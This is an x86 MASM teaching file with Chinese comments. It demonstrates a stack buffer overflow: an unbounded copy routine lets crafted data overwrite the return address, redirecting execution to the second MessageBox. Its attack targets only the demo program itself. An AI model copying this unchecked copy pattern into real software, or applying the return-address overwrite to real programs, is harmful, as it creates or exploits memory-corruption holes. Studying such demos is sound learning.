;----------------------
;利用栈溢出执行第二个窗口
;----------------------

.386

.model flat,stdcall

option casemap:none

include windows.inc

include user32.inc

includelib user32.lib

include kernel32.inc

includelib kernel32.lib

 

.data 

szText db 'hellowordpe',0 

szText2 db 'Touch Me!',0

;szShellCode dd 0ffffffh,0
;szShellCode dd 0ffffffffh, 11111111h, 040103Ch, 0 ;这样写00会被删除，会从40103C计算
szShellCode dd 0ffffffffh, 3C111111h, 04010h, 0 ;0040103C 111111FF FFFFFFFF

.code

_memCopy proc _lpSrc

	local @buf[4]:byte

	pushad

	mov al,1

	mov esi,_lpSrc

	lea edi,@buf

	mov al,byte ptr[esi]

	.while al!=0

		mov byte ptr [edi],al

		mov al,byte  ptr [esi]

		inc esi

		inc edi

	.endw

	popad

	ret

_memCopy endp

start:

invoke _memCopy,addr szShellCode

invoke MessageBox,NULL,offset szText,NULL,MB_OK

invoke MessageBox,NULL,offset szText2,NULL,MB_OK ;只执行这个窗口

invoke ExitProcess,NULL

end start

;-----------------------------------
;利用_memCopy没有对拷贝长度做限制这一栈溢出漏洞，
;让程序执行_memCopy函数后，执行我们的代码
;比如，这里让_memCopy后直接执行第二个窗口
;那就需要想办法将_memCopy执行后的eip指向第二个窗口函数地址
;构造溢出数据shellcode，入栈，完成溢出，实现控制eip
;
;栈结构      低地址
;    pushad        |-----8
;                  |-----7
;                  |-----6
;                  |-----5
;                  |-----4
;                  |-----3   [...]
;                  |-----2   [ebp-C]
;                  |-----1   [ebp-8]
;
;	local          |-----buf [ebp-4] ;结束覆盖位置
;       
;	ebp
;                  |-----ebp
;
;	ret			   |-----ret [ebp+4] ;开始覆盖位置 EIP
;            高地址
;
;
;构造ShellCode
;入栈顺序：ret->ebp->local，一共有12个字节的操作空间
;szShellCode db 0xffffffffh, @2, @3,0
;上面标记出了@2和@3,需要用这组组合好ret地址，刚好为第二个窗口的地址即可。
;调试器查看第二个窗口函数地址0x0040103C，
;组合ShellCode 0xffffffffh, 11111111h, 040103Ch, 0
;
;------------------------------------